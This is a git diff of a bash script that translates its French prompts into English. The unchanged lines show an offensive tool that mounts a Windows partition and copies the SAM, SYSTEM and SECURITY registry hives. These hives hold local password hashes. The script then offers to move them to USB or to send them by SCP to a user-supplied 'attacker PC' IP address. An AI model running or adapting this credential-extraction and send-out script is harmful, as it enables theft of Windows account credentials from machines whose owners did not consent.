@@ -17,9 +17,9 @@ WIN_PART=$(lsblk -pnlo NAME,FSTYPE | awk '$2=="ntfs"{print $1}' | while read p; 
     umount "$WIN_MOUNT"
 done)
 
-[ -z "${WIN_PART:-}" ] && { echo "[!] Partition Windows non trouvée"; exit 1; }
+[ -z "${WIN_PART:-}" ] && { echo "[!] Windows partition not found"; exit 1; }
 
-echo "[+] Partition Windows détectée : $WIN_PART"
+echo "[+] Windows partition detected : $WIN_PART"
 
 mount -o ro "$WIN_PART" "$WIN_MOUNT"
 
@@ -28,10 +28,10 @@ mkdir -p "$TEMP_DEST/sam_raw" "$TEMP_DEST/chntpw_output"
 
 cp "$WIN_MOUNT/Windows/System32/config/"{SAM,SYSTEM,SECURITY} "$TEMP_DEST/sam_raw/"
 
-echo "=== Méthode de transfert ==="
-echo "1. SCP (transfert réseau)"
-echo "2. USB (transfert local - par défaut)"
-read -r -p "Transférer la base SAM via SCP (1) ou USB (2)? [2]: " TRANSFER_METHOD
+echo "---Transfer Method---"
+echo "1. SCP (network)"
+echo "2. USB (local - default)"
+read -r -p "Transfer SAM via SCP (1) or USB (2)? [2]: " TRANSFER_METHOD
 
 TRANSFER_METHOD=${TRANSFER_METHOD:-2}
 if [ "$TRANSFER_METHOD" == "2" ]; then
@@ -39,7 +39,7 @@ if [ "$TRANSFER_METHOD" == "2" ]; then
     echo "[+] Transfert vers USB..."
     mv "$TEMP_DEST" "$DEST"
     FINAL_DEST="$DEST"
-    echo "Données enregistrées dans : $DEST"
+    echo "SAM saved here : $DEST"
 else
     read -r -p "Entrez le nom d'utilisateur pour le transfert SCP : " SCP_USER
     read -r -p "Entrez l'adresse IP du PC attaquant : " ATTACKER_IP
@@ -50,4 +50,4 @@ else
 fi
 
 umount "$WIN_MOUNT"
-echo "Extraction terminée"
+echo "extraction complete"
